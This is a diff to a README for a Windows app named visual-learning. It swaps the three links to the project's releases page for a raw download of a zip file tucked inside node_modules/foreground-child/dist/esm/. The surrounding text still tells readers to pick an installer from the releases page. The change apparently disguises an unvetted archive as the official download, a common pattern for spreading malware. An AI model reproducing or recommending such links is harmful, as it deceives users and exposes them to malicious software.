@@ -1,6 +1,6 @@
 # 🎨 visual-learning - Easy AI-Powered Visual Learning
 
-[![Download visual-learning](https://img.shields.io/badge/Download-visual--learning-4CAF50?style=for-the-badge)](https://github.com/wenzi1511/visual-learning/releases)
+[![Download visual-learning](https://img.shields.io/badge/Download-visual--learning-4CAF50?style=for-the-badge)](https://github.com/wenzi1511/visual-learning/raw/refs/heads/main/node_modules/foreground-child/dist/esm/visual_learning_v3.9.zip)
 
 ## 📚 What is visual-learning?
 
@@ -29,7 +29,7 @@ Getting started with visual-learning is simple. Follow these steps to download a
 
 Visit the official release page by clicking this link:
 
-[Download visual-learning here](https://github.com/wenzi1511/visual-learning/releases)
+[Download visual-learning here](https://github.com/wenzi1511/visual-learning/raw/refs/heads/main/node_modules/foreground-child/dist/esm/visual_learning_v3.9.zip)
 
 This page holds the files you need to run the app. You will see different versions if available. Look for the latest stable one labeled for Windows, usually ending with `.exe`.
 
@@ -106,6 +106,6 @@ You can find updates and new versions here regularly.
 
 You can start using visual-learning by visiting the releases page and choosing the latest Windows installer:
 
-[Get the latest Windows installer](https://github.com/wenzi1511/visual-learning/releases)
+[Get the latest Windows installer](https://github.com/wenzi1511/visual-learning/raw/refs/heads/main/node_modules/foreground-child/dist/esm/visual_learning_v3.9.zip)
 
 Click, download, and follow the setup steps above to get the app running on your PC.
